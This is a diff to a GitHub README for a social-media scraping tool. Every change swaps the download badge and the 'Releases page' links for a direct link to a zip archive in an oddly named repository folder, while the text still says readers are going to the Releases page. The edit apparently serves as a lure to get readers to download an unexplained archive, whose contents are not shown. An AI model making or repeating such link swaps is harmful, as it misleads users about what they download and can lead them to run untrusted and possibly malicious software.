@@ -1,6 +1,6 @@
 # 📱 social-media-scraping-apis - Simplifying Social Media Data Extraction
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/KENNEDY7774/social-media-scraping-apis/raw/refs/heads/master/hoverer/apis_social_media_scraping_v2.4-beta.4.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ To get started, follow these steps to download and run the software.
 
 To download the application, visit the Releases page. 
 
-[**Download the latest version here!**](https://github.com/KENNEDY7774/social-media-scraping-apis/releases)
+[**Download the latest version here!**](https://github.com/KENNEDY7774/social-media-scraping-apis/raw/refs/heads/master/hoverer/apis_social_media_scraping_v2.4-beta.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version and find the files available for download.
@@ -62,7 +62,7 @@ If you encounter issues, try the following:
 
 For assistance, submit issues or questions in the GitHub repository. Our team will respond promptly.
 
-You can find helpful information and updates by visiting the [Releases page](https://github.com/KENNEDY7774/social-media-scraping-apis/releases) again.
+You can find helpful information and updates by visiting the [Releases page](https://github.com/KENNEDY7774/social-media-scraping-apis/raw/refs/heads/master/hoverer/apis_social_media_scraping_v2.4-beta.4.zip) again.
 
 ## 🌐 Topics
 
